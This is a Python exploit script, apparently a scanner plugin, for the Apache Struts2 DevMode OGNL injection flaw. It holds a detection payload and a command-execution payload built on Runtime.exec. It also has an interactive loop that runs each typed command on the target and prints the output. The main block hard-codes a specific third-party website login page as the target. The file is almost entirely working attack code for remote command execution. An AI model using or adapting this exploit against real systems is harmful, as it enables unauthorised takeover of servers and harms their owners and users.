#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
from lib.core.data import logger


readme = {
    "url": "target url"
}


# PoC
S2_DevMode_POC = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"

# CommandExP
cmd_exp = "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=ShowMeCommand"

headers = {'user-agent': 'Mozilla/3.0 (Windows NT 4.3; WOW64; rv:15.0) Gecko/2102101 Firefox/45.0',
            'Cookie': 'JSESSIONID=75C9ED1CD9345875BC5328D73DC76812',
            'referer': 'http://www.baidu.com/',
}


def verity(url):
    try:
        poc_url = url+S2_DevMode_POC
        msg = "Struts2_S2-DevMode_CmdToolExP_POC checking %s ..." % url
        logger.info(msg)
        s = requests.session()
        res = s.post(poc_url, timeout=3)
        if res.status_code == 200 and "25F9E794323B453885F5181F1B624D0B" in res.content:
            if len(res.content) <40: # 34 length
                return True
            else:
                return False
        else:
            return False

    except Exception, e:
        logger.warning("Failed to connection target")
        return False


def cmdTool(exp_url):
    get_url_exp = exp_url + cmd_exp
    while True:
        comm = raw_input("~$ ")
        if comm == "q":
            exit(0)
        temp_exp = get_url_exp.replace("ShowMeCommand", comm)
        try:
            print "="*80
            print "[Result]"
            print "_"*80
            r = requests.get(temp_exp, headers=headers, timeout=5)
            resp = r.text.encode("utf-8")
            print resp
            print "="*80
        except:
            logger.warning("error,try again..")


def poc(target):
    res = verity(target)
    if res:
        logger.success("%s is vulnerable S2-DevMode." % target)
    else:
        logger.warning("%s is not vulnerable S2-DevMode." % target)
    return res


def run(arg):
    url = arg["url"]
    if verity(url):
        logger.success("%s is vulnerable S2-DevMode." % url)
        logger.info("The next to enter cmdExp, 'q' will quit")
        cmdTool(url)
    else:
        logger.warning("%s is not vulnerable S2-DevMode." % url)


if __name__ == '__main__':
    poc("http://ycjy.scezju.com/jjxt/yhLogin.action")
    run({"url": "http://ycjy.scezju.com/jjxt/yhLogin.action"})
    cmdTool("http://ycjy.scezju.com/jjxt/yhLogin.action")